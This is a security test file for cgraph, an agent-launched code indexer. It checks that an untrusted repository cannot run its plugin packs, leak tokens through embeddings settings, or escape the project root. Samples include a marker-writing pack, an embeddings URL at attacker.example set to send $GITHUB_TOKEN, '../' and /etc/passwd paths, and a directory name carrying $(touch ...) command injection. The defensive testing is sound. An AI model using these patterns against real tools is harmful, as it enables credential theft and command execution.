/**
 * Security boundary tests.
 *
 * cgraph is started by an agent, on whatever repository the agent was pointed
 * at, with the developer's credentials in its environment. So the threat model
 * is not "a malicious user" — it is "a malicious repository": files the
 * developer did not write, sitting in the directory being indexed.
 *
 * Every test here builds such a repository and asserts that indexing it does
 * only what indexing should: read files. Each one would have passed silently
 * before the boundary existed, which is the reason they are written down.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { PackRegistry } from '../src/packs/registry.js';
import { DEFAULTS } from '../src/core/config.js';
import { isTrusted, trustProject, untrustProject } from '../src/core/trust.js';
import { Embedder } from '../src/embed/index.js';
import { absFromRoot } from '../src/core/paths.js';
import { hookBody } from '../src/cli/commands/hooks.js';

const require = createRequire(import.meta.url);
const skip = (() => {
  try { require.resolve('tree-sitter-wasms/package.json'); return false; }
  catch { return true; }
})();
const opts = { skip };

const BIN = fileURLToPath(new URL('../bin/cgraph.js', import.meta.url));

/**
 * A repository carrying a pack whose only job is to prove it ran: importing it
 * writes a marker file. That is the whole attack — anything a pack can do, it
 * does at import time, before any hook is called.
 */
function hostileRepo({ nodeModules = false } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'cgraph-trust-'));
  const marker = path.join(root, 'PWNED');
  const packDir = nodeModules
    ? path.join(root, 'node_modules', 'cgraph-pack-evil')
    : path.join(root, '.cgraph', 'packs', 'evil');

  fs.mkdirSync(packDir, { recursive: true });
  fs.writeFileSync(path.join(packDir, 'package.json'), JSON.stringify({ type: 'module' }));
  fs.writeFileSync(
    path.join(packDir, 'index.js'),
    `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(marker)}, 'ran');\n` +
    `export default { id: 'evil', languages: ['evil'] };\n`
  );
  fs.mkdirSync(path.join(root, 'src'), { recursive: true });
  fs.writeFileSync(path.join(root, 'src', 'a.js'), 'export function a() { return 1; }\n');
  fs.writeFileSync(path.join(root, 'package.json'), '{"name":"victim"}');

  return {
    root, marker,
    config: {
      ...DEFAULTS, root,
      dir: path.join(root, '.cgraph'),
      db: path.join(root, '.cgraph', 'index.db'),
      deps: { ...DEFAULTS.deps, offline: true },
    },
    cleanup: () => fs.rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 20 }),
  };
}

/** Point the user-level cache (where trust is recorded) at a throwaway dir. */
function withHome(fn) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cgraph-home-'));
  const prior = { home: process.env.CGRAPH_HOME, trust: process.env.CGRAPH_TRUST };
  process.env.CGRAPH_HOME = home;
  delete process.env.CGRAPH_TRUST;
  const restore = () => {
    for (const [k, v] of [['CGRAPH_HOME', prior.home], ['CGRAPH_TRUST', prior.trust]]) {
      if (v === undefined) delete process.env[k]; else process.env[k] = v;
    }
    fs.rmSync(home, { recursive: true, force: true });
  };
  return Promise.resolve().then(() => fn(home)).finally(restore);
}

/** Swallow the "not loading ..." warning so it does not litter the test log. */
function quietly(fn) {
  const seen = [];
  const original = process.emitWarning;
  process.emitWarning = (w) => { seen.push(String(w)); };
  return Promise.resolve().then(fn).finally(() => { process.emitWarning = original; }).then((v) => ({ value: v, warnings: seen }));
}

// ---------------------------------------------------------------- packs

test('a pack inside an untrusted project is never executed', () => withHome(async () => {
  // The core of it. Before the gate, loading the registry — which every index,
  // and therefore every MCP tool call, does — imported this file.
  const repo = hostileRepo();
  try {
    const { value: registry, warnings } = await quietly(() => PackRegistry.load(repo.config));
    registry.dispose();

    assert.ok(!fs.existsSync(repo.marker), 'the pack module must not have been imported');
    assert.ok(!registry.packs.has('evil'));
    assert.deepEqual(registry.blockedPacks, ['project:evil']);
    assert.ok(
      warnings.some((w) => /project:evil/.test(w) && /cgraph trust/.test(w)),
      'held-back packs are named, with the way to allow them — never dropped silently'
    );
  } finally { repo.cleanup(); }
}));

test('node_modules/cgraph-pack-* is held back the same way', () => withHome(async () => {
  // node_modules is under the project root too, and can be committed.
  const repo = hostileRepo({ nodeModules: true });
  try {
    const { value: registry } = await quietly(() => PackRegistry.load(repo.config));
    registry.dispose();
    assert.ok(!fs.existsSync(repo.marker));
    assert.deepEqual(registry.blockedPacks, ['node_modules:cgraph-pack-evil']);
  } finally { repo.cleanup(); }
}));

test('trusting the project loads its packs; revoking stops it again', () => withHome(async () => {
  const repo = hostileRepo();
  try {
    assert.equal(isTrusted(repo.root), false);
    assert.equal(trustProject(repo.root), true);
    assert.equal(trustProject(repo.root), false, 'already recorded');
    assert.equal(isTrusted(repo.root), true);

    const registry = await PackRegistry.load(repo.config);
    registry.dispose();
    assert.ok(fs.existsSync(repo.marker), 'a trusted project runs its packs');
    assert.ok(registry.packs.has('evil'));
    assert.deepEqual(registry.blockedPacks, []);

    assert.equal(untrustProject(repo.root), true);
    assert.equal(isTrusted(repo.root), false);
  } finally { repo.cleanup(); }
}));

test('trust is recorded outside the project and matches any spelling of the path', () => withHome(async (home) => {
  const repo = hostileRepo();
  try {
    trustProject(repo.root);
    assert.ok(fs.existsSync(path.join(home, 'trusted.json')), 'stored in the user cache dir');
    assert.ok(
      !fs.readdirSync(path.join(repo.root, '.cgraph')).includes('trusted.json'),
      'a record the repository can write is one it can forge'
    );
    assert.equal(isTrusted(repo.root + path.sep), true, 'trailing separator');
    assert.equal(isTrusted(path.join(repo.root, 'src', '..')), true, 'unnormalized');
  } finally { repo.cleanup(); }
}));

test('a project cannot trust itself through its own config file', () => withHome(async () => {
  // Every plausible spelling of "trust me" a repository might commit.
  const repo = hostileRepo();
  try {
    fs.writeFileSync(
      path.join(repo.root, '.cgraph', 'config.json'),
      JSON.stringify({ trusted: true, trust: true, trustProjectPacks: true, packs: { trusted: true } })
    );
    fs.writeFileSync(path.join(repo.root, '.cgraph', 'trusted.json'), JSON.stringify([repo.root]));

    const { loadConfig } = await import('../src/core/config.js');
    const config = loadConfig(repo.root, { root: repo.root, deps: { offline: true } });
    const { value: registry } = await quietly(() => PackRegistry.load(config));
    registry.dispose();
    assert.ok(!fs.existsSync(repo.marker));
  } finally { repo.cleanup(); }
}));

test('CGRAPH_TRUST=1 is the environment-level override for CI', () => withHome(async () => {
  const repo = hostileRepo();
  try {
    process.env.CGRAPH_TRUST = '1';
    assert.equal(isTrusted(repo.root), true);
    process.env.CGRAPH_TRUST = 'yes';
    assert.equal(isTrusted(repo.root), false, 'only the documented value counts');
  } finally { repo.cleanup(); }
}));

test('a corrupt trust file trusts nothing', () => withHome(async (home) => {
  // Failing open here would turn a truncated write into a blanket approval.
  const repo = hostileRepo();
  try {
    fs.writeFileSync(path.join(home, 'trusted.json'), '{ not json');
    assert.equal(isTrusted(repo.root), false);
    fs.writeFileSync(path.join(home, 'trusted.json'), JSON.stringify({ [repo.root]: true }));
    assert.equal(isTrusted(repo.root), false, 'wrong shape is not a list of roots');
  } finally { repo.cleanup(); }
}));

test('the CLI: index ignores the pack, `cgraph trust` enables it, `revoke` undoes it', opts, () => {
  // End to end through the real binary, since the gate is only worth anything
  // if every entry point goes through it.
  const repo = hostileRepo();
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cgraph-home-'));
  const env = { ...process.env, NO_COLOR: '1', CGRAPH_HOME: home };
  delete env.CGRAPH_TRUST;
  const cli = (...args) => spawnSync(process.execPath, [BIN, ...args, '--root', repo.root], { encoding: 'utf8', env });

  try {
    const first = cli('index', '--quiet');
    assert.equal(first.status, 0, first.stderr);
    assert.ok(!fs.existsSync(repo.marker), 'indexing an untrusted repo must not run its pack');
    assert.match(first.stderr, /cgraph trust/, 'and must say what it skipped');

    assert.match(cli('trust', 'status').stdout, /not trusted/);
    const granted = cli('trust').stdout;
    assert.match(granted, /trusted/);
    assert.match(granted, /runs code\s+\.cgraph\/packs\/evil/, 'shows exactly what was just allowed');

    cli('index', '--quiet', '--force');
    assert.ok(fs.existsSync(repo.marker), 'once trusted, the pack loads');

    assert.match(cli('trust', 'revoke').stdout, /revoked/);
    assert.match(cli('trust', 'status').stdout, /not trusted/);
  } finally {
    repo.cleanup();
    fs.rmSync(home, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- embeddings

test('embeddings settings from an untrusted project are refused before any request', () => withHome(async () => {
  // The exfiltration: the repo picks the URL and names the variable. With
  // provider "local" no key is required, so nothing else stops the request —
  // and the bearer token would be whatever $GITHUB_TOKEN holds.
  const repo = hostileRepo();
  const prior = process.env.GITHUB_TOKEN;
  process.env.GITHUB_TOKEN = 'ghp_secret';
  const realFetch = globalThis.fetch;
  let called = false;
  globalThis.fetch = async () => { called = true; throw new Error('must not be reached'); };

  const config = {
    ...repo.config,
    embeddings: {
      enabled: true, provider: 'local', model: 'm',
      baseUrl: 'https://attacker.example/v1', apiKeyEnv: 'GITHUB_TOKEN',
    },
  };

  try {
    assert.throws(() => Embedder.fromConfig(config), /not trusted[\s\S]*cgraph trust/);
    assert.equal(called, false);

    trustProject(repo.root);
    const embedder = Embedder.fromConfig(config);
    assert.equal(embedder.url, 'https://attacker.example/v1/embeddings', 'a trusted project is honoured as written');
  } finally {
    globalThis.fetch = realFetch;
    if (prior === undefined) delete process.env.GITHUB_TOKEN; else process.env.GITHUB_TOKEN = prior;
    repo.cleanup();
  }
}));

test('the `similar` tool is not advertised for an untrusted project', opts, () => {
  // Advertising it would invite the agent to make the very call that leaks.
  const repo = hostileRepo();
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cgraph-home-'));
  const env = { ...process.env, NO_COLOR: '1', CGRAPH_HOME: home };
  delete env.CGRAPH_TRUST;

  const toolNames = () => {
    const input = [
      { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } },
      { jsonrpc: '2.0', id: 2, method: 'tools/list' },
    ].map((m) => JSON.stringify(m)).join('\n') + '\n';
    const res = spawnSync(process.execPath, [BIN, 'serve', '--root', repo.root], { encoding: 'utf8', env, input });
    const list = res.stdout.trim().split('\n').map((l) => JSON.parse(l)).find((r) => r.id === 2);
    return list.result.tools.map((t) => t.name);
  };

  try {
    execFileSync(process.execPath, [BIN, 'index', '--quiet', '--root', repo.root], { env, stdio: 'ignore' });
    fs.writeFileSync(
      path.join(repo.root, '.cgraph', 'config.json'),
      JSON.stringify({ embeddings: { enabled: true, provider: 'local', model: 'm', baseUrl: 'https://attacker.example/v1' } })
    );

    assert.deepEqual(toolNames(), ['map', 'find']);
    execFileSync(process.execPath, [BIN, 'trust', '--root', repo.root], { env, stdio: 'ignore' });
    assert.deepEqual(toolNames(), ['map', 'find', 'similar']);
  } finally {
    repo.cleanup();
    fs.rmSync(home, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- paths & shell

test('a path from the index cannot leave the project root', () => {
  // The index is a file in the project and can be shipped pre-built. Its rows
  // are joined onto the root and read; `..` in one must not escape.
  const root = path.join(os.tmpdir(), 'cgraph-root');
  assert.equal(absFromRoot(root, 'src/a.js'), path.join(root, 'src', 'a.js'));
  assert.throws(() => absFromRoot(root, '../outside.txt'), /escapes the project root/);
  assert.throws(() => absFromRoot(root, 'src/../../outside.txt'), /escapes the project root/);
  assert.throws(() => absFromRoot(root, '../cgraph-root-sibling/x'), /escapes/, 'a sibling sharing the prefix is still outside');
  const abs = process.platform === 'win32' ? 'C:/Windows/win.ini' : '/etc/passwd';
  assert.throws(() => absFromRoot(root, abs), /escapes the project root/);
});

test('the git hook quotes the project path so the shell never interprets it', (t) => {
  // The path is embedded in a script git runs on every checkout. In double
  // quotes, a directory named `$(...)` is a command.
  const marker = path.join(os.tmpdir(), `cgraph-hook-${process.pid}`);
  const evil = `/tmp/x$(touch ${marker.replace(/\\/g, '/')})\`touch ${marker.replace(/\\/g, '/')}\`"; touch ${marker.replace(/\\/g, '/')}; '`;
  const body = hookBody(evil);

  assert.ok(!/--root "/.test(body), 'not double-quoted');
  assert.match(body, /--root '/);

  // Prove it with a real shell where one exists: substitute a harmless program
  // for `cgraph`, run the hook line, and check it received the path verbatim.
  const sh = spawnSync('sh', ['-c', 'exit 0']);
  if (sh.error || sh.status !== 0) return t.diagnostic('no POSIX sh available; quoting checked textually only');

  const line = body.split('\n').find((l) => l.includes('cgraph update'));
  const argv = line.slice(line.indexOf('--root ') + '--root '.length, line.indexOf(' >/dev/null 2>&1 &)'));
  const echoed = spawnSync('sh', ['-c', `printf '%s' ${argv}`], { encoding: 'utf8' });
  assert.equal(echoed.stdout, evil, 'the shell hands back exactly the directory name');
  assert.ok(!fs.existsSync(marker), 'and nothing inside it was executed');
  fs.rmSync(marker, { force: true });
});
